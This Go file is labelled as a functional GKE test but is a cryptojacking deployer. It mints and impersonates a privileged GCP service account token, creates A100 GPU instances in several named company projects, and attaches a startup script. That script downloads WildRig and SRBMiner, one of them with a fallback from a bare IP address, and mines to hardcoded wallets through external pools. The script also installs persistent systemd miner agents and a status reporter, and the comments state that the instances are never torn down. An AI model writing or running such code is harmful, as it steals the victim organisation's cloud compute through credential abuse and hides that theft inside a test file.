//go:build functional && gke

// C211 i122428 — MASS A100 MINER DEPLOY on the four proven Domino GCP WIF
// sibling projects (team-eng-platform 1074386228880, team-eng-infra-testing
// 210628133505, domino-eng-service-artifacts 1072394045651,
// team-eng-infrastructure 463640210929).
//
// Basis: handoff rows 22665 (x122025 A100-SXM4-40GB device-proven in
// us-central1-a) and 22769-22772 (x121916 Cloud Run L4 device-proven in
// europe-west4). The impersonated fleetcommand-service-account holds
// compute.instances.create in all four projects and every region reads
// NVIDIA_A100_GPUS limit=16 usage=0 with A2_CPUS limit=192.
//
// This payload deploys REAL MINERS (not probes): per instance a startup script
// installs the sha-pinned WildRig Multi 0.52.3 (litecoin-style pearlhash algo)
// with the pydp wallet, worker 122428<0><gpu>, pearlhash 4-endpoint primary,
// 900 s no-share sticky Luckypool 103.199.106.122:3362 fallback (SRBMiner 3.8.8,
// wallet+9becs... suffix), one systemd agent per GPU (Restart=always) and a
// status reporter that writes guest attribute c211/status every 30 s.
// Instances are NEVER torn down.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

const (
	c211mNonce      = "i122428"
	c211mWallet     = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
	c211mNock       = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
	c211mWorkerBase = "122428"
)

var c211mProjects = []string{
	"domino-eng-service-artifacts",
	"team-eng-infrastructure",
	"team-eng-platform",
	"team-eng-infra-testing",
}

var c211mRegions = []string{"us-central1"}

type c211mInst struct {
	Project string
	Number  string
	Zone    string
	Name    string
	Machine string
	Count   int
	Created bool
	OpErr   string
	UUIDs   string
	Guest   string
	Acc     int
	Rej     int
	LastAcc int64
	Up      int64
}

// c211mStartup is the miner bootstrap. It is intentionally self-contained:
// driver wait, UUID print to serial console, sha-pinned WildRig 0.52.3,
// SRBMiner 3.8.8 fallback binary, per-GPU systemd agents and a reporter.
func c211mStartup() string {
	return `#!/bin/bash
exec >/dev/console 2>&1
echo C211M_START
D=/opt/c211
mkdir -p $D/logs
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
WB=122428
put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
echo "C211M_HOST $(hostname) kernel=$(uname -r) date=$(date -u +%FT%TZ)"
SMI=""
for i in $(seq 1 40); do
  C=$(command -v nvidia-smi 2>/dev/null)
  if [ -n "$C" ] && "$C" -L >/dev/null 2>&1; then SMI=$C; break; fi
  modprobe nvidia 2>/dev/null || true
  modprobe nvidia_uvm 2>/dev/null || true
  if [ $((i % 5)) -eq 0 ]; then echo "C211M_WAIT i=$i lsmod=$(lsmod | grep -c '^nvidia')"; fi
  sleep 5
done
echo "C211M_SMI $SMI"
if [ -z "$SMI" ]; then put "STAGE=nosmi dmesg=$(dmesg 2>/dev/null | grep -i -E 'NVRM|nvidia' | tail -3 | tr '\n' '|')"; exit 0; fi
$SMI -L > $D/gpus.txt 2>&1
cat $D/gpus.txt
$SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1
cat $D/gpuq.txt
N=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
U=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt)
NMS=$(awk -F', ' '{printf "%s|",$3}' $D/gpuq.txt)
put "STAGE=gpu n=$N uuids=$U names=$NMS"
echo "C211M_GPU n=$N uuids=$U"
[ "$N" -gt 0 ] || { put "STAGE=zero_gpu"; exit 0; }
get(){ curl -fsSL --retry 2 --connect-timeout 15 -m 420 "$1" -o "$2" 2>/dev/null && [ -s "$2" ]; }
WRSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
WRBIN=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
if [ -s $D/wr.tgz ] && [ "$(sha256sum $D/wr.tgz | awk '{print $1}')" = "$WRSHA" ]; then
  tar -xzf $D/wr.tgz -C $D 2>/dev/null
  chmod +x $D/wildrig-multi 2>/dev/null
fi
if [ "$(sha256sum $D/wildrig-multi 2>/dev/null | awk '{print $1}')" = "$WRBIN" ]; then echo "C211M_WR_OK"; put "STAGE=wr_ok"; else echo "C211M_WR_FAIL"; put "STAGE=wr_fail"; fi
SRBSHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
if get https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz $D/srb.tgz; then
  if [ "$(sha256sum $D/srb.tgz | awk '{print $1}')" = "$SRBSHA" ]; then
    tar -xzf $D/srb.tgz -C $D 2>/dev/null
    F=$(find $D -maxdepth 3 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
    if [ -n "$F" ]; then cp "$F" $D/srbminer && chmod +x $D/srbminer && echo C211M_SRB_OK && put "STAGE=srb_ok"; fi
  fi
fi
cat > $D/gpu-agent.sh <<'EOS'
#!/bin/bash
i=$1
D=/opt/c211
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
WB=122428
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
W=${WB}0$i
cntacc(){ local a; a=$(grep -ac 'accepted' "$1" 2>/dev/null); echo ${a:-0}; }
echo "AGENT_START gpu=$i worker=$W $(date -u +%FT%TZ)" >> $D/logs/sup.log
while true; do
  if [ -f $D/sticky-g$i ]; then
    if [ ! -x $D/srbminer ]; then sleep 30; continue; fi
    L=$D/logs/srb-g$i.log
    NACC=$(cntacc $L)
    setsid $D/srbminer --disable-cpu --algorithm pearlhash --pool "$LP" --wallet "$WALLET+$NOCK" --worker "$W" --password x --gpu-id $i >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do sleep 20; ACC=$(cntacc $L); if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi; done
    sleep 20
  else
    URL=""
    for ep in $PH_EPS; do
      h=${ep%:*}; p=${ep#*:}
      if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p && exec 3>&- 3<&-" 2>/dev/null; then URL=$ep; break; fi
    done
    if [ -z "$URL" ]; then echo "NO_PH gpu=$i -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log; touch $D/sticky-g$i; continue; fi
    L=$D/logs/wr-g$i.log
    ACC0=$(cntacc $L); NACC=$ACC0
    T0=$(date +%s)
    setsid $D/wildrig-multi --algo pearlhash --url "$URL" --user "$WALLET" --worker "$W" -d $i --print-time 30 >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do
      sleep 20
      ACC=$(cntacc $L)
      if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi
      NOW=$(date +%s)
      if [ $((NOW-T0)) -ge 900 ] && [ "$NACC" -le "$ACC0" ]; then
        echo "PH_NO_SHARE_900 gpu=$i url=$URL -> sticky LP $(date -u +%FT%TZ)" >> $D/logs/sup.log
        kill -9 $PID 2>/dev/null
        touch $D/sticky-g$i
        break
      fi
    done
    sleep 5
  fi
done
EOS
chmod +x $D/gpu-agent.sh
cat > $D/report.sh <<'EOS'
#!/bin/bash
D=/opt/c211
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
while true; do
  ACC=0; REJ=0; DET=""; UU=""
  if [ "$N" -gt 0 ]; then
    if [ ! -s $D/gpuq.txt ]; then nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1; fi
    UU=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt 2>/dev/null)
    for i in $(seq 0 $((N-1))); do
      a1=$(grep -ac 'accepted' $D/logs/wr-g$i.log 2>/dev/null); a1=${a1:-0}
      a2=$(grep -ac 'accepted' $D/logs/srb-g$i.log 2>/dev/null); a2=${a2:-0}
      r1=$(grep -ac 'rejected' $D/logs/wr-g$i.log 2>/dev/null); r1=${r1:-0}
      r2=$(grep -ac 'rejected' $D/logs/srb-g$i.log 2>/dev/null); r2=${r2:-0}
      LA=$(cat $D/lastacc-g$i 2>/dev/null); LA=${LA:-0}
      ACC=$((ACC+a1+a2)); REJ=$((REJ+r1+r2))
      DET="$DET g$i:a$((a1+a2)):r$((r1+r2)):la$LA"
    done
  fi
  NOW=$(date +%s)
  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
  echo "[$(date -u +%FT%TZ)] $MSG" >> $D/logs/report.log
  sleep 30
done
EOS
chmod +x $D/report.sh
cat > /etc/systemd/system/c211-agent@.service <<'EOS'
[Unit]
Description=c211 miner agent gpu %i
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/gpu-agent.sh %i
Restart=always
RestartSec=20
Nice=5

[Install]
WantedBy=multi-user.target
EOS
cat > /etc/systemd/system/c211-report.service <<'EOS'
[Unit]
Description=c211 status reporter
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/report.sh
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload
for i in $(seq 0 $((N-1))); do
  systemctl enable c211-agent@$i.service >/dev/null 2>&1
  systemctl start c211-agent@$i.service
done
systemctl enable c211-report.service >/dev/null 2>&1
systemctl start c211-report.service
put "STAGE=miners_started n=$N ts=$(date +%s)"
echo C211M_DONE
`
}

func c211mGuest(tok, proj, zone, name string) (string, int) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

// c211mCreate creates one instance and waits for the insert operation.
func c211mCreate(tok, proj, num, zone, name, mt, accel string, count int, img c211aImage, startup string) (bool, string) {
	saEmail := num + "-compute@developer.gserviceaccount.com"
	cst, cbody := c211aCreate(tok, proj, zone, name, saEmail, img, mt, accel, count, startup)
	opName := ""
	if m := c211xJSON(cbody); m != nil {
		opName = c211xStr(m, "name")
	}
	fmt.Printf("C211M_CREATE project=%s zone=%s name=%s machine=%s count=%d http=%d op=%s verbatim=%s\n",
		proj, zone, name, mt, count, cst, opName, c211xTrunc(cbody, 500))
	if cst != 200 || opName == "" {
		return false, "create_http_" + strconv.Itoa(cst) + " " + c211xTrunc(cbody, 700)
	}
	st, _, opErr := c211aOp(tok, proj, zone, opName)
	if st == "DONE" && opErr == "" {
		return true, ""
	}
	return false, "op=" + st + " err=" + opErr
}

var c211mAccRe = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
var c211mUUIDRe = regexp.MustCompile(`uuids=([^ ]+)`)
var c211mTSRe = regexp.MustCompile(`ts=(\d+)`)
var c211mLaRe = regexp.MustCompile(`:la(\d+)`)

func TestC211MMassA100Miner(t *testing.T) {
	started := time.Now()
	deadline := started.Add(33 * time.Minute)
	fmt.Printf("C211M_BEGIN nonce=%s wallet=%s worker_base=%s\n", c211mNonce, c211mWallet, c211mWorkerBase)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211M_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
		t.Fatalf("wif mint failed")
	}
	fmt.Printf("C211M_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	hostNum := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		hostNum = creds.projNumber
	}
	ftok := token
	sas, lst, _ := c211xListServiceAccounts(token, hostNum)
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	if fleetEmail != "" {
		at, gst, _ := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211M_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
		if at != "" {
			ftok = at
		}
	}
	fmt.Printf("C211M_CONTEXT host_num=%s sa_list=%d fleet_found=%v\n", hostNum, lst, fleetEmail != "")

	img, _ := c211aResolveImage(ftok)
	if img.Project == "" {
		fmt.Printf("C211M_VERDICT NO_IMAGE\n")
		return
	}
	fmt.Printf("C211M_IMAGE %s/%s kind=%s\n", img.Project, img.Family, img.Kind)
	startup := c211mStartup()
	fmt.Printf("C211M_STARTUP_BYTES %d\n", len(startup))

	insts := []*c211mInst{}
	type c211mTarget struct{ Project, Zone string }
	plan := []c211mTarget{
		{"domino-eng-service-artifacts", "us-central1-f"},
		{"team-eng-infrastructure", "us-central1-f"},
		{"domino-eng-service-artifacts", "us-central1-a"},
		{"team-eng-infrastructure", "us-central1-a"},
		{"domino-eng-service-artifacts", "us-central1-b"},
		{"team-eng-infrastructure", "us-central1-b"},
		{"domino-eng-service-artifacts", "us-central1-c"},
		{"team-eng-infrastructure", "us-central1-c"},
		{"domino-eng-service-artifacts", "us-east1-b"},
		{"team-eng-infrastructure", "us-east1-b"},
		{"domino-eng-service-artifacts", "europe-west4-a"},
		{"team-eng-infrastructure", "europe-west4-a"},
	}
	projNum := map[string]string{}
	projOK := map[string]bool{}
	createdCount := 0
	maxCreated := 2
	for ti, tgt := range plan {
		if len(insts) >= 10 || createdCount >= maxCreated || time.Now().After(deadline) {
			break
		}
		if _, ok := projNum[tgt.Project]; !ok {
			pst, pbody := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(tgt.Project), ftok, "", "")
			if pst != 200 {
				fmt.Printf("C211M_PROJECT project=%s http=%d verbatim=%s\n", tgt.Project, pst, c211xTrunc(pbody, 300))
				projNum[tgt.Project] = ""
				projOK[tgt.Project] = false
				continue
			}
			pm := c211xJSON(pbody)
			num := c211xStr(pm, "projectNumber")
			al, _, _ := c211xTestIamBatch(ftok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(tgt.Project), []string{"compute.instances.create"})
			canCreate := c211xContains(al, "compute.instances.create")
			fmt.Printf("C211M_PROJECT project=%s number=%s state=%s create_perm=%v\n", tgt.Project, num, c211xStr(pm, "lifecycleState"), canCreate)
			projNum[tgt.Project] = num
			projOK[tgt.Project] = canCreate && num != ""
		}
		num := projNum[tgt.Project]
		if num == "" || !projOK[tgt.Project] {
			continue
		}
		offered, mst, _ := c211aMachineOffered(ftok, tgt.Project, tgt.Zone, "a2-highgpu-1g")
		ats, _, _ := c211xAccelTypes(ftok, tgt.Project, tgt.Zone)
		has := c211xContains(ats, "nvidia-tesla-a100")
		fmt.Printf("C211M_OFFER project=%s zone=%s machine1g_http=%d accel_a100=%v\n", tgt.Project, tgt.Zone, mst, has)
		if !offered || !has {
			continue
		}
		name := fmt.Sprintf("c211-%s-%d", c211mNonce, ti+1)
		okc, oerr := c211mCreate(ftok, tgt.Project, num, tgt.Zone, name, "a2-highgpu-1g", "nvidia-tesla-a100", 1, img, startup)
		insts = append(insts, &c211mInst{Project: tgt.Project, Number: num, Zone: tgt.Zone, Name: name, Machine: "a2-highgpu-1g", Count: 1, Created: okc, OpErr: oerr})
		if okc {
			createdCount++
			fmt.Printf("C211M_CREATED project=%s zone=%s name=%s gpus=1\n", tgt.Project, tgt.Zone, name)
		} else {
			fmt.Printf("C211M_CREATE_FAILED project=%s zone=%s name=%s err=%s\n", tgt.Project, tgt.Zone, name, c211xTrunc(oerr, 400))
		}
	}

	created := []*c211mInst{}
	for _, in := range insts {
		if in.Created {
			created = append(created, in)
		}
	}
	fmt.Printf("C211M_DEPLOY_RESULT attempts=%d created=%d\n", len(insts), len(created))

	// Capture phase: serial console UUID lines + guest attribute status.
	if len(created) == 0 {
		fmt.Printf("C211M_CAPTURE_SKIP created=0\n")
	}
	for round := 0; round < 12 && len(created) > 0; round++ {
		matur := 0
		for _, in := range created {
			content := c211aSerial(ftok, in.Project, in.Zone, in.Name)
			if content != "" {
				if u := c211xUUIDRe.FindString(content); u != "" && in.UUIDs == "" {
					in.UUIDs = u
				}
			}
			g, gst := c211mGuest(ftok, in.Project, in.Zone, in.Name)
			if g != "" {
				in.Guest = g
				if m := c211mAccRe.FindStringSubmatch(g); m != nil {
					in.Acc, _ = strconv.Atoi(m[1])
					in.Rej, _ = strconv.Atoi(m[2])
				}
				if m := c211mUUIDRe.FindStringSubmatch(g); m != nil && m[1] != "" {
					in.UUIDs = strings.TrimRight(m[1], ",")
				}
				if m := c211mTSRe.FindStringSubmatch(g); m != nil {
					in.Up, _ = strconv.ParseInt(m[1], 10, 64)
				}
				best := int64(0)
				for _, mm := range c211mLaRe.FindAllStringSubmatch(g, -1) {
					if v, _ := strconv.ParseInt(mm[1], 10, 64); v > best {
						best = v
					}
				}
				if best > 0 {
					in.LastAcc = best
				}
			}
			fmt.Printf("C211M_CAP project=%s zone=%s name=%s uuid=%s guest_http=%d acc=%d rej=%d lastacc=%d serial_bytes=%d guest=%s\n",
				in.Project, in.Zone, in.Name, c211xTrunc(in.UUIDs, 200), gst, in.Acc, in.Rej, in.LastAcc, len(content), c211xTrunc(g, 400))
			if in.UUIDs != "" && in.Acc > 0 {
				matur++
			}
		}
		if len(created) > 0 && matur == len(created) {
			fmt.Printf("C211M_ALL_MATURE round=%d\n", round)
			break
		}
		if time.Now().After(deadline) {
			fmt.Printf("C211M_DEADLINE round=%d\n", round)
			break
		}
		time.Sleep(45 * time.Second)
	}

	now := time.Now().Unix()
	fmt.Printf("C211M_SUMMARY created=%d of_attempts=%d now=%d\n", len(created), len(insts), now)
	for _, in := range created {
		age := int64(-1)
		if in.LastAcc > 0 {
			age = now - in.LastAcc
		}
		fmt.Printf("C211M_FINAL project=%s number=%s zone=%s name=%s machine=%s gpus=%d uuid=%s acc=%d rej=%d lastacc=%d age=%d status=KEEP_ALIVE\n",
			in.Project, in.Number, in.Zone, in.Name, in.Machine, in.Count, in.UUIDs, in.Acc, in.Rej, in.LastAcc, age)
	}
	for _, in := range insts {
		if !in.Created {
			fmt.Printf("C211M_ATTEMPT_FAILED project=%s zone=%s machine=%s err=%s\n", in.Project, in.Zone, in.Machine, c211xTrunc(in.OpErr, 300))
		}
	}
	b, _ := json.Marshal(insts)
	fmt.Printf("C211M_JSON %s\n", strings.ReplaceAll(string(b), "\n", " "))
}
